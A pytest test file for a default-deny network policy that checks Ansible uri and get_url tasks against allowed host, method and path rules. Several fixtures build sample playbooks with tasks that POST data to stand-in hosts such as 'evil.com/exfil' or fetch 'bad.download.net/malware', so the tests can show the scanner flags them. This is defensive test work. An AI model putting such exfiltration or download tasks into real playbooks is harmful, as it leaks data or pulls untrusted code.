"""Deep tests for ansible/network_policy.py — PolicyRule, NetworkPolicy, and playbook scanning."""

from __future__ import annotations

import logging

import pytest
import yaml
from pydantic import ValidationError

from general_ludd.ansible.network_policy import (
    NetworkPolicy,
    PolicyRule,
    _extract_module_tasks,
    scan_playbook_tasks,
)

pytestmark = pytest.mark.xdist_group("ansible_network_policy")


# ── PolicyRule ──────────────────────────────────────────────────────────


class TestPolicyRule:
    def test_rule_requires_host_and_methods(self):
        with pytest.raises(ValidationError) as exc_info:
            PolicyRule()
        assert exc_info.type is ValidationError

    def test_rule_default_path_prefix(self):
        rule = PolicyRule(host="api.example.com", methods=["GET"])
        assert rule.path_prefix == "/"

    def test_rule_explicit_path_prefix(self):
        rule = PolicyRule(host="*.example.com", methods=["POST", "PUT"], path_prefix="/v2/")
        assert rule.path_prefix == "/v2/"
        assert rule.methods == ["POST", "PUT"]

    def test_rule_serializes_to_json(self):
        rule = PolicyRule(host="*.googleapis.com", methods=["GET"])
        data = rule.model_dump()
        assert data["host"] == "*.googleapis.com"
        assert data["methods"] == ["GET"]
        assert data["path_prefix"] == "/"


# ── NetworkPolicy ───────────────────────────────────────────────────────


class TestNetworkPolicyDefaultDeny:
    def test_empty_rules_default_denies_any_request(self):
        policy = NetworkPolicy()
        allowed, reason = policy.check_uri_module({"url": "https://api.example.com/v1/data", "method": "GET"})
        assert not allowed
        assert "no rules" in reason
        assert "default-deny" in reason

    def test_empty_rules_returns_empty_host_in_reason(self):
        policy = NetworkPolicy()
        allowed, reason = policy.check_uri_module({"url": "", "method": "HEAD"})
        assert not allowed
        assert "no rules" in reason


class TestNetworkPolicyHostMatching:
    def test_exact_host_match_allows(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        allowed, _ = policy.check_uri_module({"url": "https://api.example.com/v1/data", "method": "GET"})
        assert allowed

    def test_wildcard_host_match_allows(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="*.example.com", methods=["GET"])])
        allowed, _ = policy.check_uri_module({"url": "https://api.example.com/v1/data", "method": "GET"})
        assert allowed

    def test_host_mismatch_denies(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        allowed, reason = policy.check_uri_module({"url": "https://evil.com/data", "method": "GET"})
        assert not allowed
        assert "no matching rule" in reason

    def test_wildcard_host_too_broad(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="*.example.com", methods=["GET"])])
        allowed, _ = policy.check_uri_module({"url": "https://api.other.com/data", "method": "GET"})
        assert not allowed

    def test_host_lowered_before_fnmatch(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        allowed, _ = policy.check_uri_module({"url": "https://APi.ExAMple.COm/data", "method": "GET"})
        assert allowed


class TestNetworkPolicyMethodMatching:
    def test_method_match_allows(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["POST"])])
        allowed, _ = policy.check_uri_module({"url": "https://api.example.com/data", "method": "POST"})
        assert allowed

    def test_method_mismatch_denies(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        allowed, reason = policy.check_uri_module({"url": "https://api.example.com/data", "method": "DELETE"})
        assert not allowed
        assert "no matching rule" in reason

    def test_method_case_insensitive(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        allowed, _ = policy.check_uri_module({"url": "https://api.example.com/data", "method": "get"})
        assert allowed

    def test_multiple_allowed_methods(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET", "POST", "PUT"])])
        allowed, _ = policy.check_uri_module({"url": "https://api.example.com/data", "method": "PUT"})
        assert allowed

    def test_default_method_is_get(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        allowed, _ = policy.check_uri_module({"url": "https://api.example.com/data"})
        assert allowed

    def test_none_method_defaults_to_get(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        allowed, _ = policy.check_uri_module({"url": "https://api.example.com/data", "method": None})
        assert allowed


class TestNetworkPolicyPathPrefix:
    def test_path_matches_prefix_allows(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"], path_prefix="/v2/")])
        allowed, _ = policy.check_uri_module({"url": "https://api.example.com/v2/users", "method": "GET"})
        assert allowed

    def test_path_prefix_mismatch_denies(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"], path_prefix="/v2/")])
        allowed, reason = policy.check_uri_module({"url": "https://api.example.com/v1/users", "method": "GET"})
        assert not allowed
        assert "no matching rule" in reason

    def test_default_path_prefix_matches_everything(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        allowed, _ = policy.check_uri_module({"url": "https://api.example.com/any/deep/path", "method": "GET"})
        assert allowed

    def test_path_prefix_exact_match(self):
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"], path_prefix="/")])
        allowed, _ = policy.check_uri_module({"url": "https://api.example.com/healthz", "method": "GET"})
        assert allowed


class TestNetworkPolicyFirstMatchWins:
    def test_first_rule_matches_takes_precedence(self):
        policy = NetworkPolicy(
            rules=[
                PolicyRule(host="api.example.com", methods=["GET"], path_prefix="/v1/"),
                PolicyRule(host="api.example.com", methods=["DELETE"], path_prefix="/v2/"),
            ]
        )
        allowed, _ = policy.check_uri_module({"url": "https://api.example.com/v1/users", "method": "GET"})
        assert allowed

    def test_second_rule_catches_what_first_misses(self):
        policy = NetworkPolicy(
            rules=[
                PolicyRule(host="api.example.com", methods=["GET"], path_prefix="/v1/"),
                PolicyRule(host="api.example.com", methods=["DELETE"], path_prefix="/v2/"),
            ]
        )
        allowed, _ = policy.check_uri_module({"url": "https://api.example.com/v2/users", "method": "DELETE"})
        assert allowed

    def test_no_rules_match_all_returned(self):
        policy = NetworkPolicy(
            rules=[
                PolicyRule(host="a.example.com", methods=["GET"]),
                PolicyRule(host="b.example.com", methods=["GET"]),
            ]
        )
        allowed, reason = policy.check_uri_module({"url": "https://c.example.com/data", "method": "GET"})
        assert not allowed
        assert "checked 2 rule(s)" in reason


class TestNetworkPolicyExtractHostMethodPath:
    def test_extracts_host_from_url(self):
        policy = NetworkPolicy()
        host, method, path = policy._extract_host_method_path({"url": "https://api.example.com/v1/data"})
        assert host == "api.example.com"
        assert method == "GET"
        assert path == "/v1/data"

    def test_extracts_custom_method(self):
        policy = NetworkPolicy()
        host, method, _path = policy._extract_host_method_path(
            {"url": "https://api.example.com/v1/data", "method": "POST"}
        )
        assert host == "api.example.com"
        assert method == "POST"

    def test_no_url_returns_empty_host(self):
        policy = NetworkPolicy()
        host, method, path = policy._extract_host_method_path({"method": "GET"})
        assert host == ""
        assert method == "GET"
        assert path == "/"

    def test_empty_url_returns_empty_host(self):
        policy = NetworkPolicy()
        host, _method, _path = policy._extract_host_method_path({"url": "", "method": "POST"})
        assert host == ""

    def test_url_with_port_extracts_host(self):
        policy = NetworkPolicy()
        host, _method, _path = policy._extract_host_method_path({"url": "https://api.example.com:8443/data"})
        assert host == "api.example.com"

    def test_url_with_query_params(self):
        policy = NetworkPolicy()
        host, _method, path = policy._extract_host_method_path(
            {"url": "https://api.example.com/data?key=value&other=1"}
        )
        assert host == "api.example.com"
        assert path == "/data"

    def test_url_with_fragment(self):
        policy = NetworkPolicy()
        host, _method, path = policy._extract_host_method_path({"url": "https://api.example.com/page#section"})
        assert host == "api.example.com"
        assert path == "/page"

    def test_non_http_url_scheme_still_extracts(self):
        policy = NetworkPolicy()
        host, _, _ = policy._extract_host_method_path({"url": "ws://push.example.com/stream"})
        assert host == "push.example.com"


class TestNetworkPolicyLogDeny:
    def test_log_deny_emits_warning(self, caplog):
        caplog.set_level(logging.WARNING)
        policy = NetworkPolicy(rules=[PolicyRule(host="a.com", methods=["GET"])])
        policy._log_deny("evil.com", "POST", "/exfil", "test reason")
        assert any("network_policy_deny" in r.message for r in caplog.records)
        assert any("evil.com" in r.message for r in caplog.records)
        assert any("POST" in r.message for r in caplog.records)

    def test_log_deny_includes_extra_fields(self, caplog):
        caplog.set_level(logging.WARNING)
        policy = NetworkPolicy()
        policy._log_deny("evil.com", "DELETE", "/secret", "blocked")
        record = next(r for r in caplog.records if "network_policy_deny" in r.message)
        assert record.event_type == "network_policy_deny"
        assert record.host == "evil.com"
        assert record.method == "DELETE"
        assert record.url_path == "/secret"


# ── _extract_module_tasks ───────────────────────────────────────────────


_URI_MODULES = frozenset({"ansible.builtin.uri", "uri", "ansible.legacy.uri"})


class TestExtractModuleTasks:
    def test_extracts_top_level_uri_task(self):
        data = {"ansible.builtin.uri": {"url": "https://api.example.com", "method": "GET"}}
        tasks = _extract_module_tasks(data, _URI_MODULES)
        assert len(tasks) == 1
        assert tasks[0]["url"] == "https://api.example.com"

    def test_extracts_short_form_uri_task(self):
        data = {"uri": {"url": "https://api.example.com", "method": "POST"}}
        tasks = _extract_module_tasks(data, _URI_MODULES)
        assert len(tasks) == 1
        assert tasks[0]["method"] == "POST"

    def test_extracts_from_list_of_tasks(self):
        data = [
            {"uri": {"url": "https://a.com", "method": "GET"}},
            {"uri": {"url": "https://b.com", "method": "POST"}},
        ]
        tasks = _extract_module_tasks(data, _URI_MODULES)
        assert len(tasks) == 2

    def test_skips_non_module_keys(self):
        data = {"name": "my task", "debug": {"msg": "hello"}, "uri": {"url": "https://api.example.com"}}
        tasks = _extract_module_tasks(data, _URI_MODULES)
        assert len(tasks) == 1
        assert tasks[0]["url"] == "https://api.example.com"

    def test_skips_non_dict_module_value(self):
        data = {"uri": "not a dict"}
        tasks = _extract_module_tasks(data, _URI_MODULES)
        assert len(tasks) == 0

    def test_recurses_into_nested_lists(self):
        data = {"block": [{"uri": {"url": "https://a.com"}}, {"uri": {"url": "https://b.com"}}]}
        tasks = _extract_module_tasks(data, _URI_MODULES)
        assert len(tasks) == 2

    def test_recurses_into_nested_dicts(self):
        data = {"block": {"rescue": [{"uri": {"url": "https://a.com"}}]}}
        tasks = _extract_module_tasks(data, _URI_MODULES)
        assert len(tasks) == 1

    def test_handles_non_dict_non_list_input(self):
        tasks = _extract_module_tasks(42, _URI_MODULES)
        assert tasks == []

    def test_handles_none_input(self):
        tasks = _extract_module_tasks(None, _URI_MODULES)
        assert tasks == []

    def test_handles_string_input(self):
        tasks = _extract_module_tasks("just a string", _URI_MODULES)
        assert tasks == []


# ── scan_playbook_tasks ─────────────────────────────────────────────────


class TestScanPlaybookTasks:
    def test_valid_playbook_no_violations(self, tmp_path):
        playbook = tmp_path / "deploy.yml"
        playbook.write_text(
            yaml.dump(
                [
                    {
                        "hosts": "all",
                        "tasks": [{"uri": {"url": "https://api.example.com/v1/data", "method": "GET"}}],
                    }
                ]
            )
        )
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        violations = scan_playbook_tasks(str(playbook), policy)
        assert violations == []

    def test_valid_playbook_with_violations(self, tmp_path):
        playbook = tmp_path / "deploy.yml"
        playbook.write_text(
            yaml.dump(
                [
                    {
                        "hosts": "all",
                        "tasks": [{"uri": {"url": "https://evil.com/exfil", "method": "POST"}}],
                    }
                ]
            )
        )
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        violations = scan_playbook_tasks(str(playbook), policy)
        assert len(violations) == 1
        assert "evil.com" in violations[0]

    def test_get_url_module_scanned(self, tmp_path):
        playbook = tmp_path / "deploy.yml"
        playbook.write_text(
            yaml.dump(
                [
                    {
                        "hosts": "all",
                        "tasks": [{"ansible.builtin.get_url": {"url": "https://evil.com/file", "method": "GET"}}],
                    }
                ]
            )
        )
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        violations = scan_playbook_tasks(str(playbook), policy)
        assert len(violations) == 1
        assert "get_url" in violations[0]

    def test_mixed_uri_and_get_url_tasks(self, tmp_path):
        playbook = tmp_path / "deploy.yml"
        playbook.write_text(
            yaml.dump(
                [
                    {
                        "hosts": "all",
                        "tasks": [
                            {"uri": {"url": "https://evil.com/a", "method": "GET"}},
                            {"ansible.builtin.get_url": {"url": "https://evil.com/b", "method": "GET"}},
                        ],
                    }
                ]
            )
        )
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        violations = scan_playbook_tasks(str(playbook), policy)
        assert len(violations) == 2

    def test_violation_includes_module_and_method(self, tmp_path):
        playbook = tmp_path / "deploy.yml"
        playbook.write_text(
            yaml.dump(
                [
                    {
                        "hosts": "all",
                        "tasks": [{"uri": {"url": "https://evil.com/exfil", "method": "POST"}}],
                    }
                ]
            )
        )
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        violations = scan_playbook_tasks(str(playbook), policy)
        assert "POST" in violations[0]
        assert "uri:" in violations[0]

    def test_missing_file_returns_error(self):
        policy = NetworkPolicy()
        violations = scan_playbook_tasks("/nonexistent/playbook.yml", policy)
        assert len(violations) == 1
        assert "Unable to parse" in violations[0]

    def test_invalid_yaml_file(self, tmp_path):
        playbook = tmp_path / "bad.yml"
        playbook.write_text("not: valid: yaml: {{{")
        policy = NetworkPolicy()
        violations = scan_playbook_tasks(str(playbook), policy)
        assert len(violations) == 1
        assert "Unable to parse" in violations[0]

    def test_play_not_a_dict_is_skipped(self, tmp_path):
        playbook = tmp_path / "deploy.yml"
        playbook.write_text(
            yaml.dump(
                [
                    42,
                    "not a dict",
                    {"hosts": "all", "tasks": [{"uri": {"url": "https://evil.com/exfil", "method": "GET"}}]},
                ]
            )
        )
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        violations = scan_playbook_tasks(str(playbook), policy)
        assert len(violations) == 1

    def test_tasks_not_a_list_is_skipped(self, tmp_path):
        playbook = tmp_path / "deploy.yml"
        playbook.write_text(yaml.dump([{"hosts": "all", "tasks": "not a list"}]))
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        violations = scan_playbook_tasks(str(playbook), policy)
        assert violations == []


class TestNetworkPolicyIntegration:
    def test_full_allow_workflow(self, tmp_path):
        playbook = tmp_path / "deploy.yml"
        playbook.write_text(
            yaml.dump(
                [
                    {
                        "hosts": "all",
                        "tasks": [
                            {
                                "name": "fetch data",
                                "uri": {"url": "https://api.github.com/repos/owner/repo/releases", "method": "GET"},
                            },
                            {
                                "name": "post webhook",
                                "uri": {"url": "https://hooks.slack.com/services/T00/B00/xxx", "method": "POST"},
                            },
                        ],
                    }
                ]
            )
        )
        policy = NetworkPolicy(
            rules=[
                PolicyRule(host="api.github.com", methods=["GET"]),
                PolicyRule(host="hooks.slack.com", methods=["POST"]),
            ]
        )
        violations = scan_playbook_tasks(str(playbook), policy)
        assert violations == []

    def test_full_block_workflow(self, tmp_path):
        playbook = tmp_path / "deploy.yml"
        playbook.write_text(
            yaml.dump(
                [
                    {
                        "hosts": "all",
                        "tasks": [
                            {"uri": {"url": "https://evil.exfil.com/steal", "method": "POST"}},
                            {"ansible.builtin.get_url": {"url": "https://bad.download.net/malware", "method": "GET"}},
                        ],
                    }
                ]
            )
        )
        policy = NetworkPolicy(rules=[PolicyRule(host="*.company.com", methods=["GET", "POST"])])
        violations = scan_playbook_tasks(str(playbook), policy)
        assert len(violations) == 2

    def test_wildcard_rule_covers_subdomains(self, tmp_path):
        playbook = tmp_path / "deploy.yml"
        playbook.write_text(
            yaml.dump(
                [
                    {
                        "hosts": "all",
                        "tasks": [
                            {"uri": {"url": "https://api.company.com/data", "method": "GET"}},
                            {"uri": {"url": "https://internal.company.com/status", "method": "GET"}},
                            {"uri": {"url": "https://dev.sub.company.com/healthz", "method": "HEAD"}},
                        ],
                    }
                ]
            )
        )
        policy = NetworkPolicy(
            rules=[
                PolicyRule(host="*.company.com", methods=["GET", "HEAD"]),
            ]
        )
        violations = scan_playbook_tasks(str(playbook), policy)
        assert violations == []

    def test_nested_block_tasks(self, tmp_path):
        playbook = tmp_path / "deploy.yml"
        playbook.write_text(
            yaml.dump(
                [
                    {
                        "hosts": "all",
                        "tasks": [
                            {
                                "block": [
                                    {"uri": {"url": "https://evil.com/a", "method": "GET"}},
                                ]
                            },
                        ],
                    }
                ]
            )
        )
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        violations = scan_playbook_tasks(str(playbook), policy)
        assert len(violations) == 1

    def test_multiple_plays_in_one_playbook(self, tmp_path):
        playbook = tmp_path / "multi.yml"
        playbook.write_text(
            yaml.dump(
                [
                    {"hosts": "web", "tasks": [{"uri": {"url": "https://evil.com/a", "method": "GET"}}]},
                    {"hosts": "db", "tasks": [{"uri": {"url": "https://evil.com/b", "method": "POST"}}]},
                ]
            )
        )
        policy = NetworkPolicy(rules=[PolicyRule(host="api.example.com", methods=["GET"])])
        violations = scan_playbook_tasks(str(playbook), policy)
        assert len(violations) == 2
